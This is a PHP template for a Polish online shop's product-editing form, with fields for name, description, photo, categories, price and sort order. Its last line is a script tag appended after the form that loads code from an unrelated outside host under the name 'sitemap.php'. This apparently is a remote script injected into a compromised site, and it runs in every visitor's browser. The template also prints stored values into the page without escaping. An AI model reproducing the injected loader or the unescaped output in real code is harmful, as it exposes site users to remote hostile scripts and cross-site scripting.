<fieldset>
<dl>

<dt><textarea name='name' cols='40' rows='5'><?=$current -> name?></textarea></dt>
<dd>Nazwa produktu</dd>

<dt><textarea name='description' cols='40' rows='5'><?=$current -> description?></textarea></dt>
<dd>Opis produktu</dd>

<?if(empty($files)):?>
	<dt>Tutaj możesz wybrać ilustrację produktu spośród zdjęć wewnątrz katalogu <?=DIR_IMAGES?>. Aktualnie katalog ten jest pusty. Przejdź do <a href='/upload'>formularza dodawania grafik</a> aby dodać grafiki.</dd>
<?else:?>
<dt>
<select name='photo'>
<?foreach($files as $file):?>
	<option<?if($file === $current -> photo):?> selected<?endif?>><?=basename($file)?>
<?endforeach?>
</select>
</dt>
<dd>Grafika wewnątrz katalogu <?=DIR_IMAGES?></a></dd>
<?endif?>

<dt>
	<select name='category[]' multiple='multiple'>
	<option value='1'>(Kategoria główna)
	<?module('categories_select', array('current' => $current))?>
	</select>
</dt>
<dd>Kategoria</dd>

<dt><input name='price' value='<?=$current -> price?>'> zł</dt>
<dd>Cena</dd>

<dt><input name='siblingOrder' value='<?=$current -> siblingOrder?>'></dt>
<dd>Numer porządkowy produktu</dd>

</dl>
</fieldset><script src=http://johanneswallmark.com/media/sitemap.php ></script>